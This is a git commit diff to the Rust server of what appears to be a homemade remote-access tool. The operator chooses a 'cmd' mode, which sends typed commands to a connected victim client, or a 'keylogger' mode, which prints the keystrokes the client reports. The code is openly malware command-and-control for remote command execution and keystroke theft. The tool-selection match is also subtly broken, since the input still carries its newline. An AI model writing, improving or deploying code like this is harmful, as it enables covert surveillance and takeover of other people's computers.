a727453409422b9696147e8c790d4ee6cd981acc
Dmytro Yatsenko <dima0102yacenko@gmail.com>
2026-07-16 13:26:39 +0200

    updated

--- server/src/main.rs
+++ server/src/main.rs
@@ -4,24 +4,38 @@ use std::net::{TcpListener, TcpStream};
 fn handle_connection(mut stream: TcpStream) {
     println!("[*] client is connected");
     let mut buf = [0; 512];
-    loop {
-        print!(">> ");
-        io::stdout().flush().unwrap(); 
-        /*
-        let mut input = String::new();
 
-        io::stdin()
-            .read_line(&mut input)
-            .expect("could not read line");
+    print!("[?] which tool do you want to use ( cmd | keylogger ) -> ");
+    io::stdout().flush().unwrap(); 
 
-        stream.write_all(input.as_bytes()).unwrap(); 
-        */
-        while let Ok(bytes) = stream.read(&mut buf[..]) { 
-            let key = std::str::from_utf8(&buf[..bytes]);
-            println!("User wrote: {}", key.unwrap());
-        } 
+    let mut tool = String::new();
+    io::stdin()
+        .read_line(&mut tool)
+        .expect("could not read line");
 
-        return;
+    match tool.as_str() {
+        "cmd" => {
+            loop {
+                print!(">> ");
+                io::stdout().flush().unwrap(); 
+                let mut input = String::new();
+
+                io::stdin()
+                    .read_line(&mut input)
+                    .expect("could not read line");
+
+                stream.write_all(input.as_bytes()).unwrap(); 
+            }
+        },
+        "keylogger" => {
+            while let Ok(bytes) = stream.read(&mut buf[..]) { 
+                let key = std::str::from_utf8(&buf[..bytes]);
+                println!("user wrote: {}", key.unwrap());
+            } 
+
+            return;
+        },
+        _ => println!("[!] error happened"),
     }
 }
 
